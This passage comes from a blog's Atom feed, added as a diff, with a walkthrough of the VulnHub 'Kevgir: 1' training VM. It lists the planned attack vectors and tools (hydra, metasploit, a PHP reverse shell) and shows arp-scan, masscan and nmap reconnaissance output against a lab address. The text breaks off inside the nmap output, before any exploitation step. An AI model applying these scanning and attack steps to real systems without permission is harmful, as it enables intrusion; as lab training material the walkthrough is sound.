@@ -1,0 +1,1566 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: kevgir | F4l13n5n0w]]></title>
+  <link href="http://f4l13n5n0w.github.io/blog/categories/kevgir/atom.xml" rel="self"/>
+  <link href="http://f4l13n5n0w.github.io/"/>
+  <updated>2017-04-08T06:55:00-04:00</updated>
+  <id>http://f4l13n5n0w.github.io/</id>
+  <author>
+    <name><![CDATA[F4l13n5n0w]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[[VulnHub] Kevgir: 1]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2016/05/29/vulnhub-kevgir-1/"/>
+    <updated>2016-05-29T00:26:08-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2016/05/29/vulnhub-kevgir-1</id>
+    <content type="html"><![CDATA[<p>&ldquo;For Educational Purposes</p>
+
+<p>Kevgir has designed by canyoupwnme team for training, hacking practices and exploiting. Kevgir has lots of vulnerable services and web applications for testing. We are happy to announced that.</p>
+
+<p>Have fun!&ldquo; &ndash; <a href="https://canyoupwn.me/">canyoupwn.me</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/kevgir-1,137/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>
+
+<p>Target: Kevgir: 1 (<em>10.1.1.128/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<p>A bunch of vunlerabilities exists in this machine and waiting us to dig them out, attacking vectors including:</p>
+
+<ul>
+<li>Bruteforce Attacks</li>
+<li>Web Application Vulnerabilities</li>
+<li>Hacking with Redis</li>
+<li>Hacking with Tomcat, Jenkins</li>
+<li>Hacking with Misconfigurations</li>
+<li>Hacking with CMS Exploits</li>
+<li>Local Privilege Escalation</li>
+<li>And other vulnerabilities</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
+<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
+<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
+<li>Online bruteforce attack to reveal weak passwords [<font color="FF8000">hydra</font>]</li>
+<li>Exploit multiple vulnerabilities to get a shell</li>
+<li>Enumeration and exploit the local priviledge vulnerability to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
+<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists">SecLists Dictionary</a></li>
+<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="https://www.rapid7.com/products/metasploit/index.jsp">metasploit framework</a></li>
+<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/usr/share/exploitdb# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
+</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
+</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
+</span><span class='line'>10.1.1.128  00:0c:29:c1:44:ae   VMware, Inc.
+</span><span class='line'>10.1.1.254  00:50:56:e2:6b:e8   VMware, Inc.&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.984 seconds <span class="o">(</span>85.79 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span><span class='line'>root@kali:/usr/share/exploitdb#
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><code>10.1.1.128</code> is our Target!</p>
+
+<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.128/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-05-23 10:10:36 GMT
+</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
+</span><span class='line'>Initiating SYN Stealth Scan
+</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
+</span><span class='line'>Discovered open port 8081/tcp on 10.1.1.128                                  &lt;br/&gt;
+</span><span class='line'>Discovered open port 111/tcp on 10.1.1.128                                   &lt;br/&gt;
+</span><span class='line'>Discovered open port 25/tcp on 10.1.1.128                                    &lt;br/&gt;
+</span><span class='line'>Discovered open port 8080/tcp on 10.1.1.128                                  &lt;br/&gt;
+</span><span class='line'>Discovered open port 445/tcp on 10.1.1.128                                   &lt;br/&gt;
+</span><span class='line'>Discovered open port 6379/tcp on 10.1.1.128                                  &lt;br/&gt;
+</span><span class='line'>Discovered open port 80/tcp on 10.1.1.128                                    &lt;br/&gt;
+</span><span class='line'>Discovered open port 44966/tcp on 10.1.1.128                                 &lt;br/&gt;
+</span><span class='line'>Discovered open port 9000/tcp on 10.1.1.128                                  &lt;br/&gt;
+</span><span class='line'>Discovered open port 37543/tcp on 10.1.1.128                                 &lt;br/&gt;
+</span><span class='line'>Discovered open port 59876/tcp on 10.1.1.128                                 &lt;br/&gt;
+</span><span class='line'>Discovered open port 139/tcp on 10.1.1.128                                   &lt;br/&gt;
+</span><span class='line'>Discovered open port 35812/tcp on 10.1.1.128                                 &lt;br/&gt;
+</span><span class='line'>Discovered open port 1322/tcp on 10.1.1.128                                  &lt;br/&gt;
+</span><span class='line'>Discovered open port 41295/tcp on 10.1.1.128                                 &lt;br/&gt;
+</span><span class='line'>Discovered open port 2049/tcp on 10.1.1.128                                  &lt;br/&gt;
+</span><span class='line'>Discovered open port 34551/tcp on 10.1.1.128                                 &lt;br/&gt;
+</span><span class='line'>Discovered open port 59788/tcp on 10.1.1.128
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+<span class='line-number'>153</span>
+<span class='line-number'>154</span>
+<span class='line-number'>155</span>
+<span class='line-number'>156</span>
+<span class='line-number'>157</span>
+<span class='line-number'>158</span>
+<span class='line-number'>159</span>
+<span class='line-number'>160</span>
+<span class='line-number'>161</span>
+<span class='line-number'>162</span>
+<span class='line-number'>163</span>
+<span class='line-number'>164</span>
+<span class='line-number'>165</span>
+<span class='line-number'>166</span>
+<span class='line-number'>167</span>
+<span class='line-number'>168</span>
+<span class='line-number'>169</span>
+<span class='line-number'>170</span>
+<span class='line-number'>171</span>
+<span class='line-number'>172</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA5 scan initiated Mon May <span class="m">23</span> 06:20:21 <span class="m">2016</span> as: nmap -sV -A -O -v -p 25-9000,34551-44966,59788,59876 -oN 128_nmap.txt 10.1.1.128&lt;/h1&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.128
+</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: <span class="m">19376</span> closed ports
+</span><span class='line'>PORT      STATE SERVICE     VERSION
+</span><span class='line'>25/tcp    open  ftp         vsftpd 3.0.2
+</span><span class='line'><span class="p">|</span>&lt;em&gt;smtp-commands: SMTP: EHLO <span class="m">530</span> Please login with USER and PASS.
+</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-methods: GET HEAD POST OPTIONS
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Kevgir VM
+</span><span class='line'>111/tcp   open  rpcbind     2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+</span><span class='line'><span class="p">|</span> rpcinfo:
+</span><span class='line'><span class="p">|</span>   program version   port/proto  service
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
+</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
+</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X <span class="o">(</span>workgroup: CANYOUPWNME<span class="o">)</span>
+</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X <span class="o">(</span>workgroup: CANYOUPWNME<span class="o">)</span>
+</span><span class='line'>1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span><span class='line'><span class="p">|</span> ssh-hostkey:
+</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 <span class="o">(</span>DSA<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 <span class="o">(</span>RSA<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">256</span> 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a <span class="o">(</span>ECDSA<span class="o">)</span>
+</span><span class='line'>2049/tcp  open  nfs         2-4 <span class="o">(</span>RPC <span class="c">#100003)</span>
+</span><span class='line'>6379/tcp  open  redis       Redis key-value store
+</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+</span><span class='line'><span class="p">|</span> http-methods: GET HEAD POST PUT DELETE OPTIONS
+</span><span class='line'><span class="p">|</span> Potentially risky methods: PUT DELETE
+</span><span class='line'><span class="p">|</span>&lt;em&gt;See &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://nmap.org/nsedoc/scripts/http-methods.html&quot;</span>&gt;http://nmap.org/nsedoc/scripts/http-methods.html&lt;/a&gt;
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-open-proxy: Proxy might be redirecting requests
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache-Coyote/1.1
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Apache Tomcat
+</span><span class='line'>8081/tcp  open  http        Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-generator: Joomla! 1.5 - Open Source Content Management
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 200<span class="o">)</span>
+</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">14</span> disallowed entries
+</span><span class='line'><span class="p">|</span> /administrator/ /cache/ /components/ /images/
+</span><span class='line'><span class="p">|</span> /includes/ /installation/ /language/ /libraries/ /media/
+</span><span class='line'><span class="p">|</span>&lt;em&gt;/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: Welcome to the Frontpage
+</span><span class='line'>9000/tcp  open  http        Jetty winstone-2.9
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 200<span class="o">)</span>
+</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;/
+</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Jetty<span class="o">(</span>winstone-2.9<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Dashboard <span class="o">[</span>Jenkins<span class="o">]</span>
+</span><span class='line'>34551/tcp open  ssh         Apache Mina sshd 0.8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span><span class='line'>35812/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+</span><span class='line'><span class="p">|</span> rpcinfo:
+</span><span class='line'><span class="p">|</span>   program version   port/proto  service
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
+</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
+</span><span class='line'>37543/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+</span><span class='line'><span class="p">|</span> rpcinfo:
+</span><span class='line'><span class="p">|</span>   program version   port/proto  service
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
+</span><span class='line'>41295/tcp open  unknown
+</span><span class='line'>44966/tcp open  status      <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
+</span><span class='line'><span class="p">|</span> rpcinfo:
+</span><span class='line'><span class="p">|</span>   program version   port/proto  service
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
+</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
+</span><span class='line'>59788/tcp open  nlockmgr    1-4 <span class="o">(</span>RPC <span class="c">#100021)</span>
+</span><span class='line'><span class="p">|</span> rpcinfo:
+</span><span class='line'><span class="p">|</span>   program version   port/proto  service
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
+</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
+</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
+</span><span class='line'>59876/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+</span><span class='line'><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/cgi-bin/submit.cgi?new-service&quot;</span>&gt;https://nmap.org/cgi-bin/submit.cgi?new-service&lt;/a&gt; :
+</span><span class='line'>SF-Port41295-TCP:V<span class="o">=</span>6.49BETA5%I<span class="o">=</span>7%D<span class="o">=</span>5/23%Time<span class="o">=</span>5742D989%P<span class="o">=</span>x86_64-pc-linux-gn
+</span><span class='line'>SF:u%r<span class="o">(</span>DNSVersionBindReq,36,<span class="p">&amp;</span>ldquo<span class="p">;</span>Unrecognized<span class="se">\x</span>20protocol:<span class="se">\x</span>20<span class="se">\0\x</span>06<span class="se">\x</span>01<span class="se">\0\0\x</span>
+</span><span class='line'>SF:01<span class="se">\0\0\0\0\0\0\x</span>07version<span class="se">\x</span>04bind<span class="se">\0\0\x</span>10<span class="se">\0\x</span>03<span class="se">\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequest,
+</span><span class='line'>SF:24,<span class="p">&amp;</span>ldquo<span class="p">;</span>Unrecognized<span class="se">\x</span>20protocol:<span class="se">\x</span>20<span class="se">\0\0\x</span>10<span class="se">\0\0\0\0\0\0\0\0\0\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>MAC Address: 00:0C:29:C1:44:AE <span class="o">(</span>VMware<span class="o">)</span>
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 3.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
+</span><span class='line'>OS details: Linux 3.2 - 3.19
+</span><span class='line'>Uptime guess: 0.015 days <span class="o">(</span>since Mon May <span class="m">23</span> 06:01:00 2016<span class="o">)</span>
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">247</span> <span class="o">(</span>Good luck!<span class="o">)</span>
+</span><span class='line'>IP ID Sequence Generation: All zeros
+</span><span class='line'>Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Host script results:
+</span><span class='line'><span class="p">|</span> nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+</span><span class='line'><span class="p">|</span> Names:
+</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;00&gt;      Flags: &lt;unique&gt;&lt;active&gt;
+</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;03&gt;      Flags: &lt;unique&gt;&lt;active&gt;
+</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;20&gt;      Flags: &lt;unique&gt;&lt;active&gt;
